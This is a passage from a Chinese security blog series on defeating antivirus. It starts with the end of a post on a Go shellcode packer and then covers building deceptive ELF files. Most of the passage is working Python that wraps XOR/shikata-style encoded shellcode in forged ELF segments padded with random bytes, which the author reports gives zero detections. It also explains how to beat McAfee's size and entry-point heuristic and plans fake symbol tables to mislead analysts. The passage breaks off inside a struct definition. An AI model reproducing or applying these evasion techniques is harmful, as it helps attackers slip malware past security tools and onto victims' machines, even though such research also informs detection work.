<p>有几款杀软报毒<code>Exploit.Shellcode</code>是因为他们有沙箱，而且可以看到样本的外联行为。剩下的几款杀毒引擎一看见go语言的二进制就报毒，因为我测试go语言写的<code>hello world</code> 他们也会报毒，所以没有参考价值。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-14-47.png" alt=""></p>
<p>虚拟执行能力比较强的火绒也无法检出。</p>
<p><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-01-20-12.png" alt=""></p>
<p>添加一个编码器 <code>x86/shikata_ga_nai</code> 之后的效果看起来真的不错。<br><img src="https://pic.wonderkun.cc/uploads/2021/04/2021-04-07-08-08-42.png" alt=""></p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>代码比较简单,放在了github上 <a href="https://github.com/wonderkun/go-packer" target="_blank" rel="noopener">https://github.com/wonderkun/go-packer</a>，<br>需要说明一下的是,由于<code>SysWhispers2_x86_WOW64Gate</code>中有代码是使用汇编实现的，为了能使用<code>MingGw</code>进行链接，所以必须使用<code>uasm</code>进行编译(不能使用vs的masm进行编译，否则无法完成静态链接)。<br>但是mac平台安装<code>uasm</code>比较麻烦，所以只能在windows平台上进行编译。所以本代码中放的直接就是编译好的32位的静态链接库，仅支持生成32位二进制文件，如果想生成64位的二进制文件，请自行编译静态态链接库，并修改makefile。</p>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><p><a href="https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/ta416-goes-ground-and-returns-golang-plugx-malware-loader</a></p>
</li>
<li><p><a href="https://github.com/guitmz/ezuri" target="_blank" rel="noopener">https://github.com/guitmz/ezuri</a></p>
</li>
<li><p><a href="https://www.guitmz.com/running-elf-from-memory/" target="_blank" rel="noopener">https://www.guitmz.com/running-elf-from-memory/</a></p>
</li>
<li><p><a href="https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html" target="_blank" rel="noopener">https://sysopfb.github.io/malware/2020/02/28/Golang-Wrapper-on-an-old-malware.html</a></p>
</li>
<li><p><a href="https://github.com/mai1zhi2/SysWhispers2_x86" target="_blank" rel="noopener">https://github.com/mai1zhi2/SysWhispers2_x86</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>杀软的无奈</tag>
      </tags>
  </entry>
  <entry>
    <title>杀软的无奈-构建更具有欺骗性的ELF文件(五)</title>
    <url>/2021/07/26/%E6%9D%80%E8%BD%AF%E7%9A%84%E6%97%A0%E5%A5%88-%E6%9E%84%E5%BB%BA%E6%9B%B4%E5%85%B7%E6%9C%89%E6%AC%BA%E9%AA%97%E6%80%A7%E7%9A%84ELF%E6%96%87%E4%BB%B6(%E4%BA%94)/</url>
    <content><![CDATA[<blockquote>
<p>本文首发于安全客: <a href="https://www.anquanke.com/post/id/248688" target="_blank" rel="noopener">https://www.anquanke.com/post/id/248688</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一节我们已经通过自己编写的编码器对shellcode进行了编码，并且构建了一个ELF文件，但是出乎意料的是<code>McAfee</code> 和 <code>McAfee-GW-Edition</code> 还会报毒为木马，经过我的研究，我发现<code>McAfee</code>判黑的逻辑非常简单，只要文件大小小于某个阈值，并且<code>EntryPoint</code>附近有无法反汇编的数据，就会被报黑。这么看来，想让上一节的ELF文件不被所有的引擎检测就非常简单了，只需要在文件结尾再写一些乱数据就搞定了。</p>
<a id="more"></a>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    fd.write( elf_header_bytes + elf_pheader_bytes + shellcode )</span><br><span class="line">    fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">1024</span>)] ) )</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.wonderkun.cc//uploads/note/20210614164029.png" alt=""></p>
<p>经过一步简单的操作就无法被检测出来了，从<code>McAfee</code>上的检测逻辑上就可以管中窥豹，看到杀软在做检测时候的无奈，所以恶意代码检测还是非常困难的 …</p>
<p>直接填充垃圾数据来逃过检测肯定不是一个技术爱好者的最终追求，最好的方式还是去做一个真正看起来正常，并且执行起来也正常的ELF，这样才更具备更高的迷惑性。接下来的内容就开始一步步的实现这个目标。</p>
<h2 id="链接视图和装载视图"><a href="#链接视图和装载视图" class="headerlink" title="链接视图和装载视图"></a>链接视图和装载视图</h2><p>ELF文件是<code>Executable and Linkable Format</code>(可执行与可链接格式)的简称，即可以参与执行也可以参与链接。从链接的角度来看，elf文件是<code>Section</code>(节)的形式存储的，而在装载的角度上，Elf文件又可以按<code>Segment</code>（段）来划分。区别就是在链接视角下，Program Header Table 是可选的，但是Section Header Table是必选的，执行视角的就会反过来。节信息是ELF中信息的组织单元，段信息是节信息的汇总，指出一大段信息(包含若干个节)在加载执行过程中的属性。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210615001514.png" alt=""></p>
<p>由于在很多翻译文章中，段和节的概念总是混淆，导致傻傻分不清楚，所以在以后的文章中我们统一约定 <code>Segment</code> 为段，<code>Section</code>为节。</p>
<h2 id="丰富ELF文件的段信息"><a href="#丰富ELF文件的段信息" class="headerlink" title="丰富ELF文件的段信息"></a>丰富ELF文件的段信息</h2><p>ELF文件常见的段类型有如下几种:</p>
<table>
<thead>
<tr>
<th align="left">名字</th>
<th align="left">取值</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">PT_NULL</td>
<td align="left">0</td>
<td align="left">表明段未使用，其结构中其他成员都是未定义的。</td>
</tr>
<tr>
<td align="left">PT_LOAD</td>
<td align="left">1</td>
<td align="left">此类型段为一个可加载的段，大小由 p_filesz 和 p_memsz 描述。文件中的字节被映射到相应内存段开始处。如果 p_memsz 大于 p_filesz，“剩余” 的字节都要被置为 0。p_filesz 不能大于 p_memsz。可加载的段在程序头部中按照 p_vaddr 的升序排列。</td>
</tr>
<tr>
<td align="left">PT_DYNAMIC</td>
<td align="left">2</td>
<td align="left">此类型段给出动态链接信息，指向的是 .dynamic 节。</td>
</tr>
<tr>
<td align="left">PT_INTERP</td>
<td align="left">3</td>
<td align="left">此类型段给出了一个以 NULL 结尾的字符串的位置和长度，该字符串将被当作解释器调用。这种段类型仅对可执行文件有意义（也可能出现在共享目标文件中）。此外，这种段在一个文件中最多出现一次。而且这种类型的段存在的话，它必须在所有可加载段项的前面。</td>
</tr>
<tr>
<td align="left">PT_NOTE</td>
<td align="left">4</td>
<td align="left">此类型段给出附加信息的位置和大小。</td>
</tr>
<tr>
<td align="left">PT_SHLIB</td>
<td align="left">5</td>
<td align="left">该段类型被保留，不过语义未指定。而且，包含这种类型的段的程序不符合 ABI 标准。</td>
</tr>
<tr>
<td align="left">PT_PHDR</td>
<td align="left">6</td>
<td align="left">该段类型的数组元素如果存在的话，则给出了程序头部表自身的大小和位置，既包括在文件中也包括在内存中的信息。此类型的段在文件中最多出现一次。<strong>此外，只有程序头部表是程序的内存映像的一部分时，它才会出现</strong>。如果此类型段存在，则必须在所有可加载段项目的前面。</td>
</tr>
<tr>
<td align="left">PT_LOPROC~PT_HIPROC</td>
<td align="left">0x70000000 ~0x7fffffff</td>
<td align="left">此范围的类型保留给处理器专用语义。</td>
</tr>
</tbody></table>
<p>其中 <code>PT_LOAD</code> 和 <code>PT_DYNAMIC</code> 这两种类型的段在执行的时候会被加载到内存中去。<br>现在问题来了，我们现在需要为ELF文件伪造哪些段，并且分别存储什么样的数据才会显得像是一个正常的ELF文件呢？</p>
<h3 id="动态链接的ELF文件"><a href="#动态链接的ELF文件" class="headerlink" title="动态链接的ELF文件"></a>动态链接的ELF文件</h3><p><strong>最好的学习方法是模仿</strong>，我们打开一个gcc编译的正常的ELF文件，并采用动态的链接方式：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210615103553.png" alt=""></p>
<p>可以看到主要有如下几个的段：</p>
<ol>
<li><p>PT_PHDR: 不必再解释了。</p>
</li>
<li><p>PT_INERP: 指出了解释器的路径，一般的值为 <code>/lib/ld-linux.so.2</code>。 比较有意思的是如果把这个数据给修改了， 文件就无法正常执行了。例如下面的实验：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ strings ./a.out    | grep /lib/ld-linux  </span><br><span class="line">/lib/ld-linux.so.3</span><br><span class="line"><span class="comment"># 把 PT_INERP 的数据修改为 '/lib/ld-linux.so.3' </span></span><br><span class="line"></span><br><span class="line">$ ./a.out </span><br><span class="line">bash: ./a.out: No such file or directory</span><br><span class="line"><span class="comment"># 尝试执行就会报错，告诉你 ./a.out 文件存在</span></span><br><span class="line"></span><br><span class="line">$ /lib/ld-linux.so.2  ./a.out </span><br><span class="line">dds</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 /lib/ld-linux.so.2 进行加载就可以正常执行</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>PT_LOAD: 不必再解释了。</p>
</li>
<li><p>PT_DYNAMIC:  此类型段给出动态链接信息，指向的是 .dynamic 节。动态链接的ELF文件会有这个段。</p>
</li>
<li><p>PT_NOTE: 不必再解释了。</p>
</li>
<li><p>PT_GNU_EH_FRAME: 指向 .eh_frame_hdr 节，与异常处理相关，我们暂时先不关注</p>
</li>
<li><p>PT_GNU_STACK: 用来标记栈是否可执行的，编译选项 <code>-z execstack/noexecstack</code> 的具体实现。</p>
</li>
<li><p>PT_GNU_RELRO:  relro(read only relocation)安全机制，linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读，从定位之后的函数指针被修改。</p>
</li>
</ol>
<p>接下来我们为ELF文件伪造如下段: <code>PT_PHDR</code>,<code>PT_INERP</code>,<code>两个PT_LOAD</code>,<code>PT_NOTE</code>，理论上就可以就可以构造一个看起来正常并且可执行的ELF文件了。</p>
<p>但是linux中动态链接的ELF文件和静态链接的ELF文件的加载执行过程还是存在着比较大的差异，这其中涉及到很多我们没有讲到的知识，所以想直接构建出动态链接的ELF文件是有困难的，关于这部分知识我会在以后的ELF壳专题文章中进行详细的拆解。</p>
<h3 id="静态链接的ELF文件"><a href="#静态链接的ELF文件" class="headerlink" title="静态链接的ELF文件"></a>静态链接的ELF文件</h3><p>编译一个静态链接的ELF文件，<code>gcc -m32 test.c  -o test -static</code>,编译后文件大小是642kb(关于静态链接的背后是怎么实现的，以后再写其他文章进行详解),查看 <code>Segment</code> 信息如下：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210629125019.png" alt=""></p>
<p>注意 <code>PT_GNU_RELRO</code> 段指向的数据和第二个 <code>PT_LOAD</code> 段指向的是同一块数据。<br>接下来我们构造如下的段信息 <code>两个PT_LOAD</code>,<code>PT_NOTE</code>,<code>PT_TLS</code>,<code>PT_GNU_RELRO</code>段，我们接着上一节的代码写:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    decodeSub,shellcode,length,key =  generate_shikata_block(generate_shellcode())</span><br><span class="line">    print(decodeSub+shellcode,length,key)</span><br><span class="line"></span><br><span class="line">    shellcode = xor_encrypt(decodeSub,shellcode,length,key)</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="string">""</span>.join( </span><br><span class="line">            [ </span><br><span class="line">                chr( i ) <span class="keyword">for</span> i <span class="keyword">in</span> shellcode </span><br><span class="line">            ] </span><br><span class="line">        ).encode(<span class="string">"latin-1"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># shellcode = pad(shellcode,b=b"\xcc")</span></span><br><span class="line">    elf_header = build_elf_header()</span><br><span class="line">    pheaders = []</span><br><span class="line"></span><br><span class="line">    PHEADERS_LEN = <span class="number">5</span></span><br><span class="line">    elf_header.e_phnum = PHEADERS_LEN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># PT_NOTE_LEN = random.randint(0x50,0x100) //4 * 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_NOTE 段</span></span><br><span class="line">    PT_NOTE_LEN = <span class="number">0x44</span></span><br><span class="line">    elf_pheader_pt_note = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x4</span>,</span><br><span class="line">        p_flags = <span class="number">0x4</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR,</span><br><span class="line">        </span><br><span class="line">        p_paddr = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + MEM_VADDR ,</span><br><span class="line"></span><br><span class="line">        p_filesz = PT_NOTE_LEN, <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = PT_NOTE_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x4</span>   </span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 伪造第一个 PT_LOAD 段</span></span><br><span class="line">    elf_pheader_pt_load_1 = build_elf_pheader()</span><br><span class="line">    elf_pheader_pt_load_1.p_filesz = c.sizeof( elf_header ) </span><br><span class="line">    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN</span><br><span class="line">    len(shellcode) </span><br><span class="line"></span><br><span class="line">    elf_pheader_pt_load_1.p_memsz  =  c.sizeof( elf_header ) </span><br><span class="line">    + c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN</span><br><span class="line">    len(shellcode)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_TLS </span></span><br><span class="line">    PT_TLS_LEN = random.randint(<span class="number">0x50</span>,<span class="number">0x100</span>) //<span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    elf_pheader_pt_tls = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x7</span>,</span><br><span class="line">        p_flags = <span class="number">0x4</span>, </span><br><span class="line">        p_offset =  c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_filesz = PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x4</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造第二个 PT_LOAD 段</span></span><br><span class="line">    LOADABLE_LEN = random.randint(<span class="number">0x100</span>,<span class="number">0x200</span>)//<span class="number">4</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    elf_pheader_pt_load_2 = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">0x1</span>,</span><br><span class="line">        p_flags = <span class="number">0x6</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> ,</span><br><span class="line"></span><br><span class="line">        p_filesz = LOADABLE_LEN + PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = LOADABLE_LEN + PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x1000</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 伪造 PT_GNU_RELRO 段</span></span><br><span class="line">    elf_pheader_pt_gun_relro = ElfN_Phdr(</span><br><span class="line">        p_type = <span class="number">1685382482</span>,</span><br><span class="line">        p_flags = <span class="number">0x6</span>, </span><br><span class="line">        p_offset = c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) ,</span><br><span class="line"></span><br><span class="line">        p_vaddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span>,</span><br><span class="line"></span><br><span class="line">        p_paddr = MEM_VADDR  + c.sizeof( ElfN_Ehdr ) + </span><br><span class="line">        c.sizeof( ElfN_Phdr ) *PHEADERS_LEN + PT_NOTE_LEN + len(shellcode) + <span class="number">0x1000</span> ,</span><br><span class="line"></span><br><span class="line">        p_filesz = LOADABLE_LEN + PT_TLS_LEN , <span class="comment"># 文件大小 </span></span><br><span class="line">        p_memsz = LOADABLE_LEN + PT_TLS_LEN, <span class="comment"># 加载到内存中的大小</span></span><br><span class="line">        p_align = <span class="number">0x1</span></span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    pheaders = [</span><br><span class="line">        elf_pheader_pt_load_1,elf_pheader_pt_load_2,</span><br><span class="line">        elf_pheader_pt_note,elf_pheader_pt_tls,elf_pheader_pt_gun_relro</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    elf_header.e_entry = elf_pheader_pt_load_1.p_vaddr + \</span><br><span class="line">        c.sizeof( ElfN_Ehdr ) + \</span><br><span class="line">        c.sizeof( ElfN_Phdr ) * PHEADERS_LEN  + PT_NOTE_LEN</span><br><span class="line">    <span class="comment"># elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span></span><br><span class="line">    <span class="comment"># elf_pheader_bytes = c.string_at(c.addressof(elf_pheader_pt_load_1),c.sizeof(elf_pheader_pt_load_1))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">with</span> open(FILENAME,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        elf_header_bytes = c.string_at(c.addressof(elf_header),c.sizeof(elf_header))</span><br><span class="line">        fd.write( elf_header_bytes)</span><br><span class="line">        <span class="keyword">for</span> ph <span class="keyword">in</span> pheaders:</span><br><span class="line">            fd.write( c.string_at( c.addressof(ph),c.sizeof(ph) ) )</span><br><span class="line">        </span><br><span class="line">        fd.write( bytes([ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_NOTE_LEN)]  ) )</span><br><span class="line">        fd.write(shellcode)</span><br><span class="line">        </span><br><span class="line">        fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(PT_TLS_LEN)] )  )</span><br><span class="line">        fd.write( bytes( [ random.randint(<span class="number">0x00</span>,<span class="number">0xff</span>) <span class="keyword">for</span> i <span class="keyword">in</span>  range(LOADABLE_LEN)] ) )</span><br></pre></td></tr></table></figure>

<p>这样伪造的ELF文件大小为1kb，就是彻底的0查杀了。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210629134339.png" alt=""></p>
<h2 id="丰富ELF文件的节信息"><a href="#丰富ELF文件的节信息" class="headerlink" title="丰富ELF文件的节信息"></a>丰富ELF文件的节信息</h2><p><code>Section</code>信息对于静态链接的ELF文件来讲是完全不必要的存在，但是如果一个可执行文件没有节信息，那必然看起来很奇怪，势必会引起杀软的关注，那么下面就开始继续伪造ELF文件的节信息。</p>
<p>我们知道，当一个静态链接的二进制没有符号的时候，分析起来是比较困难的，但是如果一个静态链接的二进制全是错误的符号信息，那是不是也能混淆视听呢？ 那好，我们接下来的目标就是构造一堆乱七八糟的符号来误导反汇编的结果。</p>
<p>ELF文件的符号信息主要存储在section <code>.symtab</code> 中，首先先来大概的说明一下 <code>.symtab</code>符号表的结构，以下以x86为例说明：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">Elf32_Word st_name;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  是符号名的字符串表示在字符串表中的索引，一般是`.strtab`节中的索引值，如果该值非 0，则它表示了给出符号名的字符串表索引，否则符号表项没有名称。</span></span><br><span class="line"><span class="comment">  注:外部 C 符号在 C 语言和目标文件的符号表中具有相同的名称。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">Elf32_Addr st_value; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  此成员给出相关联的符号的取值。依赖于具体的上下文，它可能是一个 绝对值、一个地址等等。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Elf32_Word st_size; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  很多符号具有相关的尺寸大小。例如一个数据对象的大小是对象中包含 的字节数。如果符号没有大小或者大小未知，则此成员为 0。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">目前为 0，其含义没有被定义。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Elf32_Half st_shndx;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">符号所在的节区索引值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;Elf32_sym;</span><br></pre></td></tr></table></figure>

<p>st_info 中包含符号类型和绑定信息，操纵方式如:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_BIND(i) ((i)&gt;&gt;4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_TYPE(i) ((i)&amp;0xf)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF32_ST_INFO(b, t) (((b)&lt;&lt;4) + ((t)&amp;0xf))</span></span><br></pre></td></tr></table></figure>
<p>从中可以看出，st_info 的高四位表示符号绑定，用于确定链接可见性和行为。具体的绑定类型如:</p>
<p>ELF32_ST_BIND 的取值说明如下：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>取值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>STB_LOCAL</td>
<td>0</td>
<td>局部符号在包含该符号定义的目标文件以外不可见。相同名称的局部符号可以存在于多个文件中，互不影响。</td>
</tr>
<tr>
<td>STB_GLOBAL</td>
<td>1</td>
<td>全局符号对所有将组合的目标文件都是可见的。一个文件中对某个全局符号的定义将满足另一个文件对相同全局符号的 未定义引用。</td>
</tr>
<tr>
<td>STB_WEAK</td>
<td>2</td>
<td>弱符号与全局符号类似，不过他们的定义优先级比较低。</td>
</tr>
<tr>
<td>STB_LOPROC</td>
<td>13</td>
<td>处于这个范围的取值是保留给处理器专用语义的。</td>
</tr>
<tr>
<td>STB_HIPROC</td>
<td>15</td>
<td>处于这个范围的取值是保留给处理器专用语义的。</td>
</tr>
</tbody></table>
<p>ELF32_ST_TYPE 符号类型的定义如下：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">取值</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">STT_NOTYPE</td>
<td align="center">0</td>
<td align="center">符号的类型没有指定</td>
</tr>
<tr>
<td align="center">STT_OBJECT</td>
<td align="center">1</td>
<td align="center">符号与某个数据对象相关，比如一个变量、数组等等</td>
</tr>
<tr>
<td align="center">STT_FUNC</td>
<td align="center">2</td>
<td align="center">符号与某个函数或者其他可执行代码相关</td>
</tr>
<tr>
<td align="center">STT_SECTION</td>
<td align="center">3</td>
<td align="center">符号与某个节区相关。这种类型的符号表项主要用于重定 位，通常具有 STB_LOCAL 绑定。</td>
</tr>
<tr>
<td align="center">STT_FILE</td>
<td align="center">4</td>
<td align="center">传统上，符号的名称给出了与目标文件相关的源文件的名 称。文件符号具有 STB_LOCAL 绑定，其节区索引是SHN_ABS，并且它优先于文件的其他 STB_LOCAL 符号 (如果有的话)</td>
</tr>
<tr>
<td align="center">STT_LOPROC</td>
<td align="center">13</td>
<td align="center">此范围的符号类型值保留给处理器专用语义用途。</td>
</tr>
<tr>
<td align="center">STT_HIPROC</td>
<td align="center">15</td>
<td align="center">此范围的符号类型值保留给处理器专用语义用途。</td>
</tr>
</tbody></table>
<p>接下来我们为ELF文件构造如下的节: <code>.text</code>,<code>.data.rel.ro</code>,<code>.symtab</code>,<code>.rodata</code>,<code>.strtab</code>,<code>.shstrtab</code>。其中 <code>.shstrtab</code> 是最后一个节，可以用来定位其他节的名称信息，比较特殊，关于ELF文件节信息的含义不再赘述。</p>
<h3 id="准备一些结构"><a href="#准备一些结构" class="headerlink" title="准备一些结构"></a>准备一些结构</h3><p>首先要定义节表的结构体信息：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ElfN_Shdr</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line"></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line"></span><br><span class="line">        (<span class="string">"sh_name"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_type"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_flags"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_addr"</span>,ElfN_Addr),</span><br><span class="line">        (<span class="string">"sh_offset"</span>,ElfN_Off),</span><br><span class="line">        (<span class="string">"sh_size"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_link"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_info"</span>,ElfN_Word),</span><br><span class="line">        (<span class="string">"sh_addralign"</span>,ElfN_Xword),</span><br><span class="line">        (<span class="string">"sh_entsize"</span>,ElfN_Xword)</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>
<p>为了存储符号信息，也需要定义符号表的结构体：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf32_Sym</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">        // Symbol table entries for ELF32.</span></span><br><span class="line"><span class="string">        struct Elf32_Sym &#123;</span></span><br><span class="line"><span class="string">            Elf32_Word st_name;     // Symbol name (index into string table)</span></span><br><span class="line"><span class="string">            Elf32_Addr st_value;    // Value or address associated with the symbol</span></span><br><span class="line"><span class="string">            Elf32_Word st_size;     // Size of the symbol</span></span><br><span class="line"><span class="string">            unsigned char st_info;  // Symbol's type and binding attributes</span></span><br><span class="line"><span class="string">            unsigned char st_other; // Must be zero; reserved</span></span><br><span class="line"><span class="string">            Elf32_Half st_shndx;    // Which section (header table index) it's defined in</span></span><br><span class="line"><span class="string">        &#125;; </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    _pack_ = <span class="number">1</span></span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">"st_name"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_value"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_size"</span>,c.c_uint),</span><br><span class="line">        (<span class="string">"st_info"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_other"</span>,c.c_ubyte),</span><br><span class="line">        (<span class="string">"st_shndx"</span>,c.c_ushort)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elf64_Sym</span><span class="params">(c.Structure)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">     // Symbol table entries for ELF64.</span></span><br><span class="line"><span class="string">        struct Elf64_Sym &#123;</span></span><br><span class="line"><span class="string">            Elf64_Word st_name;     // Symbol name (index into string table)</span></span><br><span class="line"><span class="string">            unsigned char st_info;  // Symbol's type and binding attributes</span></span><br><span class="line"><span class="string">            unsigned char st_other; // Must be zero; reserved</span></span><br><span class="line"><span class="string">            